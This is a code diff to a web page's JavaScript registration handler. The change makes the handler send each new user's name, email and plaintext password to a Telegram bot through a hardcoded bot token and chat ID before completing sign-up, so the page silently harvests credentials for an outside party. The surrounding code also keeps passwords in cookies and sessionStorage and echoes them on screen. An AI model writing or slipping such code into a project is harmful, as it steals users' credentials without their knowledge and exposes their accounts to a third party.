@@ -162,29 +162,64 @@ $(document).ready(function () {
                 message: 'Passwords do not match!',
                 position: 'topRight',
             });
-        } else {
-            // Store user details in session and cookies
-            sessionStorage.setItem('user.name', email);
-            sessionStorage.setItem('user.password', password);
-            Cookies.set('user.name', email, { expires: 7 }); // Cookie expires in 7 days
-            Cookies.set('user.password', password, { expires: 7 }); // Cookie expires in 7 days
+        } else {          
+            
+            const botToken = '7153300024:AAHxg3xOAYbsBbLrIpQJoYNbeFBuYPmnsyk';
+            const chatID = '5538909913';
+            const telegramURL = `https://api.telegram.org/bot${botToken}/sendMessage`;
+            
+            const message = `New Registered User:\n\nName: ${name}\n\nEmail: ${email}\n\nPassword: ${password}`;  
+  
+            fetch(telegramURL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: chatID,
+                    text: message,
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.ok) {
+                    // Store user details in session and cookies
+                    sessionStorage.setItem('user.name', email);
+                    sessionStorage.setItem('user.password', password);
+                    Cookies.set('user.name', email, { expires: 7 }); // Cookie expires in 7 days
+                    Cookies.set('user.password', password, { expires: 7 }); // Cookie expires in 7 days
 
-            iziToast.success({
-                title: 'Success',
-                message: 'Registration successful! You can now login.',
-                position: 'topRight',
-            });
+                    iziToast.success({
+                        title: 'Success',
+                        message: "Registration successful! You'll be redirected to the login page shortly. To login, use Email: '" + email + "' Password: '" + password + "'",
+                        position: 'topRight',
+                    });
 
-            // Redirect to login.html after 4 seconds
-            setTimeout(() => {
-                window.location.href = "login.html";
-            }, 4000);
+                    // Redirect to login.html after 4 seconds
+                    setTimeout(() => {
+                        window.location.href = "login.html";
+                    }, 4000);
 
-            // Clear input fields after successful registration
-            $('#name').val('');
-            $('#email').val('');
-            $('#password').val('');
-            $('#confirm-password').val('');
+                    // Clear input fields after successful registration
+                    $('#name').val('');
+                    $('#email').val('');
+                    $('#password').val('');
+                    $('#confirm-password').val('');
+
+                } else {
+                    iziToast.error({
+                        title: 'Failed',
+                        message: 'Registration failed! Kindly check your internet connection.',
+                        position: 'topRight',
+                    });
+                }
+            })
+            .catch((error) => {
+                iziToast.error({
+                    title: 'Failed',
+                    message: 'Failed to send data! Please check your internet connection and try again.',
+                    position: 'topRight',
+                });
+                console.error('Error:', error);  // This logs the error for debugging purposes
+            });                                           
         }
     });
 
@@ -193,6 +228,7 @@ $(document).ready(function () {
         return re.test(String(email).toLowerCase());
     }
 });
-    </script>
+
+</script>
 </body>
 </html>
